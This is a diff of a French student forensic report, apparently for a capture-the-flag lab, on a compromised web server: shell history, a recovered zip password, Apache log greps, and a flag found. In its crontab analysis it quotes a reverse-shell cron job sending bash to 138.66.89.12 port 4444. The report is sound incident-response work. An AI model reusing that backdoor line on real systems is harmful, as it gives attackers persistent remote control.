@@ -38,9 +38,9 @@ Les principaux IOC sont alors les suivants :
 
 Les IOC trouvés lors de l'analyse seront présentés et expliqué dans la partie suivante.
 
-[^1]: IOC.
+[^1]: IOC :
 *Un indicateur de compromission, en sécurité informatique, est une déviance ou artefact observé sur un réseau ou dans un système d'exploitation qui indique, avec un haut niveau de certitude, une intrusion informatique.*
-*source : [wikipedia.fr](https://fr.wikipedia.org/wiki/Indicateur_de_compromission)*
+*Source : [wikipedia.fr](https://fr.wikipedia.org/wiki/Indicateur_de_compromission)*
 
 
 
@@ -79,21 +79,27 @@ Pour cela taper :
 history
 ```
 
-dans cette commande :
+![Alt text](img/history.png "history.png")
 
-![Alt text](https://github.com/LuKieru/FORENSIC_TP_BOURGEOIS_LUCAS/blob/main/TP03/img/history.png "cat_hosts_passwd.png")
+on voit donc qu'il y a un fichier .zip qui a été protégé par un mot de passe "bosch_cyber_tools.zip"
+ce mot de passe peut etre lu depuis "/tmp/mypassword" cependant il a été supprimé juste après.
+Aussi, nous voyons un ping vers une adresse IP inconnue : 
 
-on voit qu'il y a un fichier .zip qui a été protégé par un mot de passe "bosch_cyber_tools.zip"
-ce mot de passe peut etre lu depuis "/tmp/mypassword"
+###### 138.66.89.12
 
+Nous essayons alors de déziper le fichier en vain :
 
 >unzip bosch_cyber_tools.zip 
 
-demande un ==mot de passe==
+demande bien un mot de passe que nous n'avons pour l'instant pas à disposition.
+
+Plusieurs commandes sont ensuites passées pour Troobleshooter cet environnement dans lequel nous nous trouvons.
 
 > cat /etc/hosts
 
-172.18.0.2
+>cat /etc/passwd
+
+![Alt text](img/cat_hosts_passwd.png "cat_hosts_passwd.png")
 
 >cat /var/www/html/index.html
 
@@ -111,31 +117,96 @@ demande un ==mot de passe==
 </body>
 </html>
 ```
+Ici nous voyons que le site a bien été mis en maintenance.
 
-
->cat .cache/
+```
+cat .cache/
 cat .bash_history 
 cat .bash_logout 
 cat .bashrc 
 cat .profile 
 cat .viminfo 
->cat .cache/
+cat .cache/
+```
 
-rien
+Ces commandes n'ont rien donné de plus pour la suite de l'enquête. Le bash_history contient la liste des commandes effectuées avant l'analyse et les autres n'ont pas permit de faire avancer le rapport.
 
->cat crontab
+En parcourant les dossiers et fichier dans /etc (shadow, passwd et hosts), nous trouvons intéressant et important de vérifier le fichier des taches planifiées.
 
-*/1 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/138.66.89.12/4444 0>&1'
+```
+cat crontab
+```
 
-tache planifiée :
-Il s'agit d'une tâche planifiée appelée Cron job, qui est exécutée sur un système Unix.
+![Alt text](img/cat_crontab.png "cat_crontab.png")
 
-Le Cron job est configuré pour s'exécuter toutes les minutes (*/1 * * * *). Il exécute la commande /bin/bash -c '/bin/bash -i >& /dev/tcp/138.66.89.12/4444 0>&1'.
+Cette commande ouvre un shell Bash et redirige son entrée/sortie vers l'adresse IP 138.66.89.12 avec le port 4444.
 
-Cette commande ouvre un shell Bash et redirige son entrée/sortie vers un socket réseau. Plus précisément, elle envoie toute la sortie standard au socket réseau à l'adresse IP 138.66.89.12 et au numéro de port 4444, et elle envoie toute l'entrée standard depuis le socket réseau vers le shell Bash.
+Le Cron job est configuré pour s'exécuter toutes les minutes (*/1 * * * *). Il exécute la commande 
 
-Ceci semble être une tentative de créer un shell inversé vers une machine distante à l'adresse IP et au numéro de port spécifiés. Il est important de noter que de telles actions peuvent être illégales et potentiellement nocives. Il est recommandé de enquêter et de remédier à de telles activités sur un système.
+```
+/bin/bash -c '/bin/bash -i >& /dev/tcp/138.66.89.12/4444 0>&1'.
+```
+D'après notre analyse, ceci semble être un Backdoor[^2]. Nous avançons de plus en plus dans l'enquête : nous savons que l'IP en question est bien malveillante et devons pousser nos recherche à partir de celle-ci.
 
->cat access.log | grep "138.66.89.12"
+[^2]: Backdoor :
+*Une backdoor, ou porte dérobée est une fonctionnalité (ici un accès) inconnue de l'utilisateur légitime qui fourni un accès secret au logiciel (ici au contenu du serveur).
+*Source : [wikipedia.fr](https://fr.wikipedia.org/wiki/Porte_dérobée)*
 
-résultat en image
+Etant sur un serveur web, nous décidons d'aller directement vérifier les logs liés au web, à Apache2 dans ce cas.
+
+```
+grep "138.66.89.12" /var/logs/apache2/access.log
+```
+![Alt text](img/cat_access.log_grep_IP.png "cat_access.log_grep_IP.png")
+
+de nombreux résultats indique pas mal d'interration sur cette IP malveillante. En survolant, nous atteignons des lignes qui rappellent les commandes obtenues dans l'historique. C'est ainsi qu'une ligne attire l'attention :
+
+![Alt text](img/grepip.png "grepip.png")
+
+Sur l'avant dernière ligne, on distingue une commande "echo" avec le contenu du fichier /tmp/mypassword qui contenait le mot de passe et qui a été supprimé.
+
+le mot de passe du fichier .zip est donc :
+
+![Alt text](img/password.png "password.png")
+
+Nous dézipons le fichier en question via le mot de passe :
+
+![Alt text](img/unzip_et_resultat.png "unzip_et_resultat.png")
+
+## Conclusions
+
+Le mot de passe qui était supprimé de l'environnement a été tout de même récupéré via les logs d'accès dans /var/logs/apache2
+
+L'attaquant s'est donc introduit pour faire remonter ce qu'il voulait (ici, les outils de bosch-cyber) sur une machine distante.
+
+Finalement, le flag est découvert, une question survient : Avons nous trouvé la manière persistante de l'attaquant ?
+La réponse est oui, via une tache planifiée dans le fichier crontab expliqué plus haut dans le rapport.
+
+## Recommandation
+
+Il est important de noter que de telles actions (la création de shell inversé vers une machine distante) sont illégales et potentiellement nocives. 
+Nous recommandons de remédier impérativement à cette activité malveillante sur le système puis d'enquêter sur cette intrusion dans le serveur.
+
+De plus, protéger le traffic arrivant et sortant de ce serveur web pour éviter à l'avenir d'autres attaques
+
+## Conclusion générale
+
+Lors de cette analyse, nous avons pu constater la présence d'une backdoor dans le système. Via ces commandes nous avons pu établir cette conclusion et diverses recommandation suite à cette intrusion
+
+Les commandes principales retenues :
+
+Commande     | Résultat
+:--------| :-----
+hitsory | découverte d'une adresse IP malveillante
+cat /etc/crontab    | découverte de la backdoor dans les tâches planifiées
+grep "138.66.89.12 /var/log/apache2/access.log     | découverte du mot de passe pour dézipper un fichier contenant le flag
+
+Fin du rapport.
+_____________________________________________________________
+
+###### Rapport rédigé le 15/02/2023 à 13:38
+
+###### Par Lucas Bourgeois
+
+###### Signature : LB
+______________________________________________________________
